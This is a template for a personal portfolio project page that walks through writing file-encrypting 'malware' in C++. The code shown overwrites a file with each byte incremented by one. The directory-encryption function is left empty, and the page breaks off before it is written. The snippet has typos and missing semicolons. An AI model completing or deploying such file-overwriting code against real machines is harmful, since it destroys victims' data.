{% extends "base.html" %} {% block title %}Jo√£o Buschinelli - Projects{% endblock %}

{% block content %}
<h1 id="typing-effect" class="display-2 mb-4"></h1>
<br>
<h2>Description</h2>

<p class="solution-text no-indent">
    Is there any way to launch a malware that encrypts files and directories in a target pc? Well, the obvious answer is yes. There are actually
    several different ways to program such a malware. In this project, I've chosen to use C++ language to practice a little (since it is not my 
    proficient programming language, yet it is super powerful). The idea here is to create a program that encrypts either a file or a directory 
    of files by adding 1 to every byte of the file(s). The code should include: the iostream and fstream headers to handle input and output streams; 
    the dirent.h header to handle directories; the sys/stat.h header to check the status of each entry in the directory; and the string.h header 
    to use string related functions.
</p>

<p class="solution-text no-indent">
    The resultant encrypted file would not be accessible after the encryption is finished, thus compromising the target pc. If this program ends up
    encrypting root folders the target will have lots of trouble.
</p>

<h3>C++ Script</h3>

<p class="solution-text no-indent">
    Since we want to encrypt files and folders, we want to define two void functions, which we shall call 'encryptFile' and 'encryptDir'. The encryptFile function
    takes a file path as input, whereas the encryptDir takes a directory path as input. This is a snippet of how the code should be structured:    
</p>


<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;fstream&gt;
            #include &lt;dirent.h&gt;
            #include &lt;sys/stat.h&gt;
            #include &lt;string.h&gt;

            void encryptFile(std::string filePath) {
            }

            void encrytpDir(std::string dirPath) {
            }

            int main() {
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    We want to make the encryptFile method to declare two file stream variables, one representing the file to be encrypted, and the
    other being a temporary file used to store the encrypted data. It then should read each byte from the file to be encrypted and encrypts it
    by adding 1 to each byte. The code should save this into the temporary file. After that, the code should read the temporary file and write its
    bytes to the original file. Of course, after all is done, we want to delete the temporary file. Let's put this into practice:
</p>


<div class="shrink">
    <pre>
        <code id="text" class="hljs language-c++">
            #include &lt;iostream&gt;
            #include &lt;fstream&gt;
            #include &lt;dirent.h&gt;
            #include &lt;sys/stat.h&gt;
            #include &lt;string.h&gt;

            void encryptFile(std::string filePath) {
                std::fstream file, tempFile;
                std::string tempFilePath = "temp.txt";

                file.open(filePath, std::ios::in);
                tempFile.open(tempFilePath, std::ios::out);

                char byte;

                while (file >> std::noskipws >> byte) {
                    byte += 1;
                    tempFile << byte;
                }

                file.close()
                tempFile.close()

                file.open(filePath, std::ios::out);
                tempFile.open(tempFilePath, std::ios::in);

                while (tempFile >> std::noskipws >> byte) {
                    file << byte;
                }

                file.close();
                tempFile.close();

                remove(tempFilePath.c_str());
            }

            void encrytpDir(std::string dirPath) {
            }

            int main() {
                return 0;
            }
        </code>
    </pre>
</div>

<p class="solution-text no-indent">
    In the while loop, the 'std::noskipws' manipulator is used to ensure that whitespaces are not skipped while reading the characters.
    Now we need to work out how to encrypt a whole directory.
</p>


{% endblock %}